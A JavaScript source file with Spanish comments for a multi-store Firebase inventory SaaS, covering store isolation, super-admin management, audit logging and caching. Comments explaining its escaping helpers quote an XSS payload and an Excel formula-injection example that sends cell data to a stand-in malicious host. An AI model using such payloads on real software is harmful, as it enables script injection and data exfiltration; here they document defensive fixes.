// =========================================================
// Adonay — Conexión a base de datos
// =========================================================
// CONECTADO A FIREBASE REAL: esta app corre sobre los 3 proyectos
// configurados en firebase-projects.js (ya no sobre mock-sdk.js). Si
// alguna vez hace falta volver a modo demo (por ejemplo para probar
// algo sin tocar datos reales), mock-sdk.js sigue en el proyecto —
// solo hay que volver a cargarlo en vez de los 3 <script> del SDK
// real en index.html y login.html, y quitar esos 3 de ahí.
//
// MULTI-PROYECTO: esta app puede vivir repartida en varios proyectos
// Firebase (ver firebase-projects.js). Cada tienda vive en UNO solo,
// así que esta página (index.html, y todo lo que cuelga de ella:
// Stock, Pedidos, Registros...) solo necesita saber en cuál — el
// login ya lo resolvió antes de mandar para acá, y lo dejó anotado
// en localStorage. Con eso alcanza para inicializar el proyecto
// correcto como la app "por defecto", y TODO el resto de este
// archivo (db, refProducts, refCuentas, refTiendas, etc.) sigue
// funcionando exactamente igual que si hubiera un solo proyecto —
// porque, para código que llama a firebase.auth()/firebase.database()
// sin nombre de app, "por defecto" siempre significa este.
//
// La única pantalla que trabaja con MÁS de un proyecto a la vez es
// el súper-admin en Tiendas/Facturación/Auditoría — y esas
// excepciones están aisladas en la sección "MULTI-CUENTA (SaaS)" más
// abajo (usan getProjectDb() de firebase-projects.js explícitamente
// en vez de este db de acá).
const proyectoActivo = localStorage.getItem(ADONAY_ACTIVE_PROJECT_KEY) || PROYECTO_COORDINADOR;
const firebaseConfig = (FIREBASE_PROJECTS[proyectoActivo] || FIREBASE_PROJECTS[PROYECTO_COORDINADOR]).config;

// Si login.html ya dejó inicializada la app "por defecto" (para que
// la sesión quedara guardada donde esta página la busca — ver el
// comentario grande arriba), se reutiliza esa misma instancia en vez
// de inicializarla de nuevo (initializeApp truena si el nombre ya
// existe). En cualquier otra página protegida, esto simplemente la
// crea por primera vez, igual que antes.
if (!firebase.apps.some(a => a.name === '[DEFAULT]')) {
  firebase.initializeApp(firebaseConfig);
}

// =========================================================
// escapeHtml — convierte texto libre (nombre de producto,
// descripción, nombre de cliente, ciudad, etc.) en algo seguro
// para insertar con innerHTML.
//
// Sin esto, cualquier campo que un usuario pueda escribir (o traer
// por Excel) podía contener HTML/JS real: alguien escribe
// <img src=x onerror="..."> como nombre de un producto, y ese
// código se ejecuta en la pantalla de TODOS los que abren Stock,
// Pedidos, Nueva Nota o Historial — incluido el admin. Se usaba
// innerHTML con los valores tal cual venían de Firebase, sin pasar
// por esto. Ahora TODO campo de texto libre se pasa por escapeHtml()
// antes de insertarse en cualquier plantilla de innerHTML.
function escapeHtml(str) {
  return String(str ?? '').replace(/[&<>"']/g, ch => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  }[ch]));
}

// escapeJsAttr — para cuando el texto va DENTRO de un onclick="..."
// con argumentos entre comillas simples, ej:
//   onclick="openEditStock('${escapeJsAttr(p.name)}')"
// Ahí el valor vive en dos capas a la vez: adentro de un string JS
// de comillas simples, y adentro de un atributo HTML de comillas
// dobles. Escapar solo la comilla simple (como se hacía antes) deja
// la comilla doble libre para romper el atributo HTML completo e
// inyectar attributes/tags nuevos. Acá se escapan ambas capas.
function escapeJsAttr(str) {
  return String(str ?? '')
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '&quot;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// sanitizeForExcel — distinto problema del XSS de arriba: cuando un
// nombre de producto/cliente se exporta a un archivo .xlsx (Stock,
// Clientes, Historial), esas celdas van tal cual dentro del archivo.
// Si un nombre empieza con =, +, - o @, Excel (y Google Sheets) lo
// puede interpretar como una FÓRMULA al abrir el archivo, no como
// texto — es la técnica conocida como "CSV/Excel Formula Injection".
// Alguien podría crear un producto con un nombre como
// =WEBSERVICE("http://sitio-malicioso.com/robar?"&A1) y ese código
// se ejecutaría solo con abrir el Excel exportado, sin que la
// persona haga nada más que abrir el archivo que ya abre siempre.
//
// El arreglo estándar: si el valor empieza con uno de esos
// caracteres, se le antepone un apóstrofe. Excel entonces lo
// muestra como texto plano en vez de evaluarlo como fórmula, y el
// apóstrofe no es visible al ver la celda.
function sanitizeForExcel(value) {
  const str = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(str)) return "'" + str;
  return str;
}

// ── App Check (desactivado hasta que actives reCAPTCHA) ──────────
// Esto bloquea peticiones que no vengan de tu app real (scripts
// externos que copien tu configuración pública). No requiere login
// ni afecta a tus usuarios — es gratis en el plan Spark.
//
// Para activarlo:
//   1. Firebase Console → Compilación → App Check → Registra tu app
//      con reCAPTCHA v3, copia el "Site Key" que te dan.
//   2. Agrega este script en el <head> de cada HTML, antes de este
//      archivo: https://www.gstatic.com/firebasejs/10.13.0/firebase-app-check-compat.js
//   3. Descomenta las 5 líneas de abajo y pega tu Site Key.
//
// const appCheck = firebase.appCheck();
// appCheck.activate(
//   'TU_SITE_KEY_DE_RECAPTCHA_AQUI',
//   true // refresca el token automáticamente
// );

const db = firebase.database();

// =========================================================
// AISLAMIENTO POR TIENDA
// =========================================================
// refProducts/refClients/refUsers/refMeta se comportan
// como refs normales de Firebase (.child(), .set(), .on(), etc.)
// pero en realidad son un Proxy: cada vez que se usa alguna de sus
// propiedades, resuelve la ruta real en el momento —
// tiendas/{currentTiendaId}/products, no el nodo raíz "products".
// currentTiendaId lo fija auth-guard.js apenas se confirma la
// sesión, ANTES de que cualquier pantalla pueda pedir datos — así
// que en la práctica cada tienda solo puede leer y escribir dentro
// de su propio nodo. Ningún archivo (stock.js, pedidos-logic.js,
// etc.) tuvo que cambiar: siguen usando refProducts.child(...) igual
// que antes, solo que ahora ese código apunta, por debajo, al cajón
// privado de la tienda que inició sesión.
// currentTiendaId: a qué tienda pertenecen los datos que se leen o
// escriben ahora mismo. auth-guard.js lo fija apenas confirma la
// sesión (ver authReady) — hasta entonces, o si esta página no usa
// auth-guard.js en absoluto (como las pruebas automatizadas de
// firebase.js sueltas), vale null y scopedRef() bloquea el acceso.
let currentTiendaId = null;

function scopedRef(nombreColeccion) {
  return new Proxy({}, {
    get(_target, prop) {
      if (!currentTiendaId) {
        throw new Error(
          `Intento de usar "${nombreColeccion}" sin una tienda activa (currentTiendaId vacío). ` +
          `Esto no debería pasar fuera de una cuenta de tienda — revisa el flujo de login.`
        );
      }
      const real = db.ref('tiendas/' + currentTiendaId + '/' + nombreColeccion);
      const valor = real[prop];
      return typeof valor === 'function' ? valor.bind(real) : valor;
    }
  });
}

const refProducts = scopedRef('products');
const refClients  = scopedRef('clients');
const refUsers    = scopedRef('usuarios');
// Ajustes propios de la tienda que ella misma puede editar (a
// diferencia de refTiendas/info, que es del súper-admin) — por ahora
// solo la tasa de cambio USD → Sol, ver getTiendaConfig/setTasaCambio.
const refConfig   = scopedRef('config');

// =========================================================
// MULTI-CUENTA (SaaS) — tiendas y súper-admin
// =========================================================
// Capa nueva, separada de /users (que hasta ahora era "el equipo
// de Adonay"). La idea: vos (el dueño del sistema) le vendés el
// acceso a distintas tiendas/empresas, cada una con su propia
// cuenta — y vos ves y administrás todas desde un rol especial
// que no pertenece a ninguna tienda.
//
//   /cuentas/{uid}                  → a qué tienda pertenece cada
//                                      persona (o si es súper-admin)
//        { rol: 'superadmin' }
//        { rol: 'admin' | 'vendedor', tiendaId }
//
//   /tiendas/{tiendaId}/info        → datos de la tienda/empresa
//        { nombre, estado: 'activa' | 'suspendida', creadoEn }
//
//   /tiendas/{tiendaId}/usuarios/{uid} → perfil de esa persona
//        DENTRO de esa tienda (nombre, correo, rol, activo)
//
// /products, /clients, /orders (y config, usuarios, meta) ya viven
// bajo /tiendas/{tiendaId}/... — ver scopedRef() más abajo, que
// arma refProducts/refClients/etc. apuntando ahí y bloquea el
// acceso si no hay tienda activa. El catálogo de una tienda está
// completamente separado del de otra.
const refCuentas = db.ref('cuentas');
const refTiendas = db.ref('tiendas');

// =========================================================
// AUDITORÍA — registro de acciones administrativas relevantes
// =========================================================
// Log de solo-escritura (append-only) de eventos del panel de
// súper-admin: crear tienda, suspender/reactivar, cambios de
// facturación. No reemplaza logs de servidor "de verdad" (esto vive
// en el mismo Realtime Database, sin backend propio), pero para una
// operación de este tamaño alcanza para responder "¿quién hizo qué y
// cuándo?" sin tener que revisar la base de datos a mano.
const refEventos = db.ref('eventos');

function registrarEvento(tipo, detalle, tiendaId) {
  // Defensivo a propósito: registrar un evento de auditoría NUNCA
  // debe poder tumbar la acción real que lo disparó (crear tienda,
  // suspenderla, etc.) — ni con un throw síncrono (ej. en pruebas
  // automatizadas donde firebase.auth() puede no existir) ni con una
  // promesa rechazada.
  try {
    const actor = (typeof currentUserName !== 'undefined' && currentUserName)
      || (firebase.auth && firebase.auth().currentUser && firebase.auth().currentUser.email)
      || 'sistema';
    return refEventos.push({
      tipo, detalle: detalle || '', tiendaId: tiendaId || null,
      actor, timestamp: firebase.database.ServerValue.TIMESTAMP
    }).catch(err => console.warn('[Auditoría] No se pudo registrar el evento:', err));
  } catch (err) {
    console.warn('[Auditoría] No se pudo registrar el evento:', err);
    return Promise.resolve();
  }
}

// Últimos N eventos, más reciente primero. Sin índice sobre
// "timestamp" en las reglas, limitToLast igual funciona (recorre el
// nodo completo) — aceptable para el volumen de eventos de este
// tamaño de operación; si crece mucho, agregar ".indexOn": ["timestamp"].
async function obtenerEventos(limit) {
  const snap = await refEventos.limitToLast(limit || 50).once('value');
  const out = [];
  snap.forEach(child => out.push({ id: child.key, ...child.val() }));
  out.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
  return out;
}

function getCuenta(uid) {
  return refCuentas.child(uid).once('value').then(snap => (snap.exists() ? snap.val() : null));
}

// ── Config propia de la tienda (Configuración) ──────────────────
// A diferencia de refTiendas/info (que solo puede tocar el
// súper-admin), esto vive en tiendas/{tiendaId}/config — el mismo
// nodo, con el mismo permiso, que ya usan products/clients — así que
// cualquier cuenta de esa tienda puede leerlo y editarlo.
function getTiendaConfig() {
  return refConfig.once('value').then(snap => snap.val() || {});
}

function setTasaCambio(valor) {
  const tasaCambio = Number(valor) || 0;
  return refConfig.update({ tasaCambio });
}

// Umbral de "stock bajo" (ver Configuración → Dashboard). 0 es un
// valor válido (solo avisa con productos agotados), por eso acá no
// se puede usar "|| 0" como en tasaCambio de arriba — Number(0) ya es
// 0 y "0 || 5" lo pisaría con el default sin querer.
function setUmbralStock(valor) {
  const n = Number(valor);
  const stockBajoUmbral = (!isNaN(n) && n >= 0) ? n : 5;
  return refConfig.update({ stockBajoUmbral });
}

// ── Logo propio de la tienda (Configuración, plan Medio/Premium) ──
// Igual que las imágenes de producto, se sube a Cloudinary y acá
// solo se guarda la URL — nunca la imagen en sí (ver cloudinary.js).
// Vive en tiendas/{tiendaId}/config/logoUrl. Lo aplica el sidebar
// (index.html) al iniciar sesión, reemplazando el ícono genérico de
// VAERON — ver aplicarLogoTienda() en auth-guard.js.
function getTiendaLogo() {
  return refConfig.child('logoUrl').once('value').then(snap => snap.val() || '');
}

function setTiendaLogo(url) {
  return refConfig.update({ logoUrl: url || null });
}

// ── Almacenes de la tienda (Configuración) ──────────────────────
// El modelo de datos tiene 6 "slots" fijos por producto
// (/products/{code}/almacenes/{alm1..alm6} — ver más abajo,
// updateWarehouseStock/addWarehouseStock/eliminarAlmacen). Lo que
// varía por plan no es la estructura de datos sino cuántos slots
// están disponibles y qué tan editables son (ver maxAlmacenes en
// plan-limits.js):
//   - Básico:  alm1 y alm2 siempre activos, con nombre fijo. El resto
//              no existe para esta tienda (queda oculto).
//   - Medio:   hasta 3 (alm1 fijo, alm2/alm3 se pueden renombrar,
//              agregar o eliminar).
//   - Premium: hasta 6, mismo mecanismo.
// alm1 NUNCA se puede desactivar/eliminar (siempre tiene que quedar
// al menos un almacén). Los demás se activan/desactivan con
// "activos" — desactivar es lo más parecido a "eliminar" sin perder
// la config si se vuelve a activar más adelante (ver eliminarAlmacen).
const ALMACENES_IDS = ['alm1', 'alm2', 'alm3', 'alm4', 'alm5', 'alm6'];
const ALMACENES_DEFAULT_NOMBRES = {
  alm1: 'Almacén 1', alm2: 'Almacén 2', alm3: 'Almacén 3',
  alm4: 'Almacén 4', alm5: 'Almacén 5', alm6: 'Almacén 6',
};
// alm1 no aparece acá: siempre está activo, no se guarda como config.
const ALMACENES_DEFAULT_ACTIVOS = { alm2: true, alm3: true, alm4: false, alm5: false, alm6: false };

function getAlmacenesConfig() {
  return getTiendaConfig().then(cfg => {
    // Compatibilidad con tiendas que ya tenían guardado el campo
    // viejo (almacenAlm3Activo, de cuando solo existía un 3er
    // almacén on/off) y todavía no tienen el nuevo almacenesActivos.
    const activosGuardados = cfg.almacenesActivos
      || (cfg.almacenAlm3Activo !== undefined ? { alm3: cfg.almacenAlm3Activo } : {});
    return {
      nombres: { ...ALMACENES_DEFAULT_NOMBRES, ...(cfg.almacenesNombres || {}) },
      activos: { alm1: true, ...ALMACENES_DEFAULT_ACTIVOS, ...activosGuardados },
    };
  });
}

function setAlmacenesConfig({ nombres, activos }) {
  const limpioNombres = {};
  ALMACENES_IDS.forEach(id => {
    limpioNombres[id] = (nombres && nombres[id] || '').trim() || ALMACENES_DEFAULT_NOMBRES[id];
  });
  const limpioActivos = { alm1: true };
  Object.keys(ALMACENES_DEFAULT_ACTIVOS).forEach(id => {
    limpioActivos[id] = !!(activos && activos[id]);
  });
  return refConfig.update({
    almacenesNombres: limpioNombres,
    almacenesActivos: limpioActivos,
  }).then(() => ({ nombres: limpioNombres, activos: limpioActivos }));
}

// Elimina (desactiva) un almacén. alm1 nunca se puede eliminar. Si el
// almacén tenía stock cargado en algún producto, ese stock se mueve
// primero al almacén activo anterior más cercano (o a alm1 si no hay
// ninguno activo antes) — así ningún producto pierde cantidad, solo
// cambia de dónde figura. El total /stock de cada producto no se
// toca: es un movimiento interno entre almacenes del mismo producto.
function eliminarAlmacen(whId) {
  if (whId === 'alm1') return Promise.reject(new Error('El Almacén 1 no se puede eliminar.'));
  if (ALMACENES_IDS.indexOf(whId) === -1) return Promise.reject(new Error('Almacén inválido.'));

  return getAlmacenesConfig().then(({ activos }) => {
    const num = parseInt(whId.replace('alm', ''), 10);
    let destino = 'alm1';
    for (let n = num - 1; n >= 2; n--) {
      const id = 'alm' + n;
      if (activos[id]) { destino = id; break; }
    }

    return refProducts.once('value').then(snap => {
      const updates = {};
      snap.forEach(child => {
        const p = child.val() || {};
        const qty = Number((p.almacenes && p.almacenes[whId]) || 0);
        if (qty > 0) {
          const actualDestino = Number((p.almacenes && p.almacenes[destino]) || 0);
          updates[`${child.key}/almacenes/${destino}`] = actualDestino + qty;
          updates[`${child.key}/almacenes/${whId}`] = 0;
        }
      });
      const moverStock = Object.keys(updates).length ? refProducts.update(updates) : Promise.resolve();

      return moverStock
        .then(() => refConfig.update({ [`almacenesActivos/${whId}`]: false }))
        .then(() => ({ destino }));
    });
  });
}

// Escucha en tiempo real cambios en la config de almacenes (nombres y
// activos). Sirve para que, si el admin agrega/elimina/renombra un
// almacén desde Configuración en OTRA pestaña del navegador (o
// incluso otra persona logueada en la misma tienda), la vista de
// Stock que ya está abierta se actualice sola, sin recargar. Se
// engancha una sola vez por sesión (ver stock.js, junto a
// watchProducts) y se apaga en stopRealtimeWatchers().
function watchAlmacenesConfig(callback) {
  const onChange = () => {
    getAlmacenesConfig().then(callback).catch(() => {});
  };
  refConfig.child('almacenesNombres').on('value', onChange);
  refConfig.child('almacenesActivos').on('value', onChange);
}

// getTiendaInfo() la usa auth-guard.js para la tienda de la PROPIA
// sesión (currentTiendaId) — siempre en el proyecto activo de esta
// página (refTiendas = db.ref('tiendas') de arriba), nunca necesita
// cruzar proyectos porque una sesión de tienda vive en uno solo.
function getTiendaInfo(tiendaId) {
  return refTiendas.child(tiendaId).child('info').once('value').then(snap => snap.val());
}

// Autorreparación de productos creados ANTES de que saveProduct()
// empezara a inicializar el desglose por almacén (ver arriba): esos
// productos quedaron con stock TOTAL pero sin ningún /almacenes,
// así que cualquier pestaña de almacén específico en Stock los
// mostraba en 0 para siempre, aunque el total fuera correcto.
//
// Se llama sola cada vez que Stock carga la lista (ver stock.js,
// watchProducts callback) — es segura de llamar todas las veces:
// solo toca productos donde /almacenes no existe en absoluto, así
// que en cuanto un producto queda reparado una vez, deja de
// calificar y nunca se vuelve a tocar. No pisa ningún producto que
// ya tenga su propio desglose (aunque no sume exacto con el total),
// para no enmascarar otro problema de datos por accidente.
function repararDistribucionAlmacenesFaltante(products) {
  if (typeof currentUserRole !== 'undefined' && currentUserRole === 'vendedor') return; // solo admin/superadmin escribe esto
  (products || []).forEach(p => {
    const stock = p.stock || 0;
    if (stock > 0 && !p.almacenes) {
      refProducts.child(p.code).child('almacenes').child('alm1').set(stock)
        .catch(err => console.warn(`[Almacenes] No se pudo reparar la distribución de "${p.code}" (revisa las reglas de Firebase para /products/{code}/almacenes):`, err.message));
    }
  });
}

// ── Súper-admin: listar/crear/editar tiendas de TODOS los proyectos ──
// A diferencia de getTiendaInfo() de arriba (una tienda, en el
// proyecto de la sesión activa), estas funciones son solo para las
// pantallas de súper-admin (Tiendas, Facturación, Auditoría) y
// recorren los proyectos configurados en firebase-projects.js
// explícitamente, con getProjectDb() — no usan el "db" de más arriba,
// porque el súper-admin necesita ver las tiendas de LOS TRES a la vez,
// no solo la del proyecto donde inició sesión.
//
// Cada tienda que devuelven trae un campo "proyecto" (ej. 'proyecto_b')
// que hay que reenviar tal cual a setTiendaEstado/editarTienda/
// eliminarTienda/actualizarFacturacion — es la única forma de saber en
// cuál de los proyectos hay que escribir el cambio.
async function listarTiendas() {
  const resultadosPorProyecto = await Promise.all(allProjectKeys().map(async proyectoKey => {
    const snap = await (await getProjectDbListo(proyectoKey)).ref('tiendas').once('value');
    const out = [];
    snap.forEach(child => {
      const info = child.val() && child.val().info ? child.val().info : {};
      const usuarios = child.val() && child.val().usuarios ? child.val().usuarios : {};
      // Tiendas creadas antes de que se empezara a guardar adminUid en
      // info no lo tienen — se busca por rol como respaldo, para no
      // dejar el contacto en blanco en cuentas viejas.
      let adminUid = info.adminUid || '';
      if (!adminUid) {
        const found = Object.keys(usuarios).find(uid => usuarios[uid].rol === 'admin');
        if (found) adminUid = found;
      }
      out.push({
        tiendaId: child.key,
        proyecto: proyectoKey,
        nombre: info.nombre || '(sin nombre)',
        telefono: info.telefono || '',
        ciudad: info.ciudad || '',
        direccion: info.direccion || '',
        estado: info.estado || 'activa',
        creadoEn: info.creadoEn || 0,
        totalUsuarios: Object.keys(usuarios).length,
        adminUid,
        adminNombre: adminUid && usuarios[adminUid] ? usuarios[adminUid].nombre : '',
        adminCorreo: adminUid && usuarios[adminUid] ? usuarios[adminUid].correo : '',
        // ── Facturación (ver actualizarFacturacion más abajo) ──
        plan: info.plan || 'basico',
        montoMensual: info.montoMensual || 0,
        estadoPago: info.estadoPago || 'al_dia', // 'al_dia' | 'pendiente' | 'vencido'
        proximoCobro: info.proximoCobro || null
      });
    });
    return out;
  }));
  const out = resultadosPorProyecto.flat();
  out.sort((a, b) => (b.creadoEn || 0) - (a.creadoEn || 0));
  return out;
}

// Actualiza el plan/monto/estado de pago de una tienda desde el
// panel de Facturación. Separado de setTiendaEstado (activa/
// suspendida) porque son dos cosas distintas: una tienda puede estar
// "pendiente" de pago y seguir activa unos días de gracia, sin que
// eso implique suspenderla automáticamente — la decisión de
// suspender sigue siendo manual, desde Tiendas.
async function actualizarFacturacion(tiendaId, data, proyecto) {
  const updates = {};
  if (data.plan !== undefined) updates.plan = data.plan;
  if (data.montoMensual !== undefined) updates.montoMensual = Number(data.montoMensual) || 0;
  if (data.estadoPago !== undefined) updates.estadoPago = data.estadoPago;
  if (data.proximoCobro !== undefined) updates.proximoCobro = data.proximoCobro;
  const projectDb = await getProjectDbListo(proyecto);
  return projectDb.ref('tiendas').child(tiendaId).child('info').update(updates).then(() => {
    registrarEvento('facturacion', `Actualizó facturación (${Object.keys(updates).join(', ')})`, tiendaId);
  });
}

// Crea una tienda nueva con su primer usuario admin — sin cerrar tu
// sesión de súper-admin. Mismo truco de "instancia secundaria de
// Firebase" que ya se usa en createVendorAccount() más abajo: se crea
// la cuenta de Auth en una app temporal aparte, así tu sesión actual
// nunca se toca.
//
// A CUÁL proyecto va: elegirProyectoConEspacio() (firebase-projects.js)
// decide el primero que todavía tiene lugar (menos de
// MAX_TIENDAS_POR_PROYECTO tiendas) — no es una elección manual.
async function crearTienda(nombreTienda, nombreAdmin, correoAdmin, password, datosContacto) {
  const contacto = datosContacto || {};
  // Teléfono, ciudad y dirección ya no son obligatorios para crear una
  // tienda — se guardan solo si vienen con datos (por ejemplo, si se
  // completan luego desde "Editar tienda").
  const proyecto = await elegirProyectoConEspacio();
  const tiendaId = 'tda_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
  const projectConfig = FIREBASE_PROJECTS[proyecto].config;
  const projectDb = await getProjectDbListo(proyecto);
  const projectRefTiendas = projectDb.ref('tiendas');
  const projectRefCuentas = projectDb.ref('cuentas');

  const secondaryApp = firebase.initializeApp(projectConfig, 'Secondary-' + Date.now());
  try {
    const cred = await secondaryApp.auth().createUserWithEmailAndPassword(correoAdmin, password);
    const uid = cred.user.uid;

    const infoTienda = {
      nombre: nombreTienda, estado: 'activa', creadoEn: Date.now(),
      adminUid: uid,
      // Facturación por defecto: plan básico, sin monto hasta que el
      // súper-admin lo configure desde Facturación.
      plan: 'basico', montoMensual: 0, estadoPago: 'al_dia',
      proximoCobro: Date.now() + 30 * 24 * 60 * 60 * 1000
    };
    // Teléfono, ciudad y dirección son opcionales — Firebase no acepta
    // valores "undefined" en .set(), así que solo se agregan si vienen
    // con datos (por ejemplo, completados luego desde "Editar tienda").
    if (contacto.telefono) infoTienda.telefono = contacto.telefono;
    if (contacto.ciudad) infoTienda.ciudad = contacto.ciudad;
    if (contacto.direccion) infoTienda.direccion = contacto.direccion;

    await projectRefTiendas.child(tiendaId).child('info').set(infoTienda);
    await projectRefTiendas.child(tiendaId).child('usuarios').child(uid).set({
      nombre: nombreAdmin, correo: correoAdmin, rol: 'admin', activo: true, creadoEn: Date.now(),
    });
    await projectRefCuentas.child(uid).set({ rol: 'admin', tiendaId });

    // El directorio (correo → proyecto) es lo que le permite al login
    // saber, la próxima vez, en cuál proyecto probar la contraseña de
    // esta persona — sin esto, la cuenta recién creada sería invisible
    // para el login aunque exista de verdad.
    await registrarEnDirectorio(correoAdmin, proyecto);

    await secondaryApp.auth().signOut();
    registrarEvento('tienda_creada', `Nueva tienda "${nombreTienda}" con admin ${correoAdmin} (${FIREBASE_PROJECTS[proyecto].label})`, tiendaId);
    return { tiendaId, uid, proyecto };
  } finally {
    await secondaryApp.delete().catch(() => {});
  }
}

async function setTiendaEstado(tiendaId, estado, proyecto) {
  const projectDb = await getProjectDbListo(proyecto);
  return projectDb.ref('tiendas').child(tiendaId).child('info').update({ estado }).then(() => {
    registrarEvento(
      estado === 'suspendida' ? 'tienda_suspendida' : 'tienda_reactivada',
      estado === 'suspendida' ? 'Tienda suspendida' : 'Tienda reactivada',
      tiendaId
    );
  });
}

// Edita los datos de contacto de la tienda (nombre, teléfono, ciudad,
// dirección) desde el panel de Tiendas. NO toca usuarios ni el correo
// de acceso — eso es responsabilidad de editarAdminNombre() abajo.
// Teléfono, ciudad y dirección son obligatorios: si alguno viene
// vacío, se rechaza en vez de guardar el campo en blanco.
async function editarTienda(tiendaId, data, proyecto) {
  if (
    (data.telefono !== undefined && !data.telefono) ||
    (data.ciudad !== undefined && !data.ciudad) ||
    (data.direccion !== undefined && !data.direccion)
  ) {
    return Promise.reject(new Error('Teléfono, ciudad y dirección no pueden quedar vacíos.'));
  }
  const updates = {};
  if (data.nombre !== undefined) updates.nombre = data.nombre;
  if (data.telefono !== undefined) updates.telefono = data.telefono;
  if (data.ciudad !== undefined) updates.ciudad = data.ciudad;
  if (data.direccion !== undefined) updates.direccion = data.direccion;
  const projectDb = await getProjectDbListo(proyecto);
  return projectDb.ref('tiendas').child(tiendaId).child('info').update(updates).then(() => {
    registrarEvento('tienda_editada', 'Actualizó los datos de la tienda', tiendaId);
  });
}

// Cambia el nombre visible del administrador de una tienda. El
// correo NO se puede editar desde acá: es la credencial real en
// Firebase Auth, y el SDK del cliente solo permite que el dueño de
// esa cuenta cambie su propio correo — un súper-admin no puede
// hacerlo por otra persona sin un backend con el Admin SDK (mismo
// límite que ya existe para las contraseñas, ver password-api de
// Musical Fever si se necesita replicar esa solución acá).
async function editarAdminNombre(tiendaId, adminUid, nombre, proyecto) {
  if (!adminUid) return Promise.reject(new Error('Esta tienda no tiene un administrador identificado.'));
  const projectDb = await getProjectDbListo(proyecto);
  return projectDb.ref('tiendas').child(tiendaId).child('usuarios').child(adminUid).update({ nombre }).then(() => {
    registrarEvento('tienda_editada', 'Actualizó el nombre del administrador', tiendaId);
  });
}

// Borra una tienda por completo: su nodo entero en /tiendas (info +
// usuarios + productos + clientes + config, todo lo que cuelgue de
// tiendaId, EN SU PROPIO PROYECTO) y, para cada usuario que tenía, su
// entrada en /cuentas de ESE MISMO proyecto — sin eso quedaría un
// mapeo huérfano uid -> tiendaId que ya no existe. También limpia su
// entrada en el directorio del coordinador (si no, el login seguiría
// pensando que ese correo vive en un proyecto donde ya no hay nada).
// A diferencia de "Suspender" (reversible), esto NO se puede deshacer.
//
// Igual que con deleteUserProfile(): esto NO borra las cuentas de
// Firebase Auth en sí (el SDK del cliente solo permite que un usuario
// borre SU PROPIA cuenta). Sin su entrada en /cuentas, auth-guard.js
// igual les bloquea el acceso al iniciar sesión — el efecto práctico
// es el mismo, solo que la credencial de Auth queda huérfana en vez
// de desaparecer del todo.
async function eliminarTienda(tiendaId, proyecto) {
  const projectDb = await getProjectDbListo(proyecto);
  const projectRefTiendas = projectDb.ref('tiendas');
  const projectRefCuentas = projectDb.ref('cuentas');

  const snap = await projectRefTiendas.child(tiendaId).child('usuarios').once('value');
  const uids = [];
  const correos = [];
  snap.forEach(child => {
    uids.push(child.key);
    if (child.val() && child.val().correo) correos.push(child.val().correo);
  });

  await Promise.all(uids.map(uid => projectRefCuentas.child(uid).remove().catch(() => {})));
  await Promise.all(correos.map(correo => quitarDeDirectorio(correo)));
  await projectRefTiendas.child(tiendaId).remove();

  registrarEvento('tienda_eliminada', 'Tienda eliminada por completo', tiendaId);
}

// =========================================================
// CACHÉ LOCAL + SINCRONIZACIÓN INCREMENTAL (products / clients)
// =========================================================
//
// Por qué existe esto: watchProducts/watchClients usaban
// refX.on('child_added'/'child_changed'/'child_removed') sobre el nodo
// COMPLETO. Firebase, al conectar un listener así por primera vez,
// reenvía TODOS los hijos existentes (dispara 'child_added' una vez
// por cada producto/cliente ya guardado). Eso pasa de nuevo cada vez
// que se recarga la página, se reabre la app, o el celular reconecta
// después de perder señal — con ~30 vendedores abriendo la app varias
// veces al día, esto era el mayor consumo de datos de toda la app y
// el principal responsable de acercarse al límite de 10GB/mes de
// descarga del plan gratis de Firebase (Spark).
//
// La solución: cada producto/cliente ahora guarda un campo
// "updatedAt" (ver saveProduct/addStock/decrementStock/saveClient más
// abajo). En vez de re-pedir TODO el nodo cada vez, se guarda en
// localStorage el resultado de la última sincronización y, la
// siguiente vez, se pide solo lo que cambió desde entonces
// (orderByChild('updatedAt').startAt(ultimaSync)) — una consulta
// mucho más chica en la enorme mayoría de los casos.
//
// Limitación aceptada a cambio de ese ahorro: un producto/cliente
// BORRADO no se detecta con esa consulta incremental (ya no tiene
// updatedAt para matchear un rango — simplemente desaparece del
// nodo). Por eso cada tanto (FULL_RESYNC_INTERVAL_MS) se paga el
// costo completo una vez, para reconciliar borrados y cualquier
// desajuste. Si se necesita que un borrado se vea al instante en
// todos los dispositivos, hay que forzar un refresco completo desde
// ahí (recargar la app cuando ya tocó la resincronización, o subir
// el intervalo).
const FULL_RESYNC_INTERVAL_MS = 3 * 60 * 60 * 1000; // 3 horas

function readLocalCache(key) {
  try {
    if (typeof localStorage === 'undefined') return null;
    const raw = localStorage.getItem(key);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    if (!parsed || typeof parsed !== 'object' || typeof parsed.items !== 'object') return null;
    return parsed;
  } catch (err) {
    return null; // localStorage corrupto, deshabilitado (modo privado) o inexistente: se sigue sin caché
  }
}

function writeLocalCache(key, cache) {
  try {
    if (typeof localStorage === 'undefined') return;
    localStorage.setItem(key, JSON.stringify(cache));
  } catch (err) {
    // Cuota de localStorage llena u otro error: la app sigue
    // funcionando igual, solo sin el ahorro de datos del caché.
  }
}

// Arma un watcher con caché+delta genérico para una colección plana
// (products o clients), reutilizado por watchProducts/watchClients.
// idField: nombre de la clave del hijo dentro de cada objeto emitido
// (ej. 'code' para productos, 'ruc' para clientes).
// Devuelve un objeto { forceRefresh } además de arrancar el watcher.
// forceRefresh() permite a otras pantallas (ej. import-stock.js
// después de terminar una importación) pedir una lectura fresca de
// TODO el nodo ahora mismo, sin esperar al listener en tiempo real
// ni a la resincronización periódica de 3 horas. Esto es lo que
// garantiza que, apenas termina una importación, los datos se vean
// actualizados al instante en la propia pantalla que importó —
// incluso si por cualquier motivo el listener en vivo tarda o falla
// en avisar (websocket que tarda un instante en reflejar la propia
// escritura, pestaña que estuvo en segundo plano, etc.).
//
// persistCache (default true): si es false, esta colección NUNCA lee
// ni escribe el snapshot en localStorage — cada vez que la app
// arranca (o el teléfono la reabre después de días sin usarla) se
// hace SIEMPRE una lectura completa y fresca del servidor antes de
// mostrar nada, en vez de pintar primero con lo que haya quedado
// guardado de una sesión anterior. Se usa en /products: un producto
// vendido en Nueva Nota depende de que su nombre/precio/stock sean
// exactos AHORA, no de hace horas o días — un dato viejo ahí no es
// solo un detalle visual, puede tumbar la confirmación de un pedido
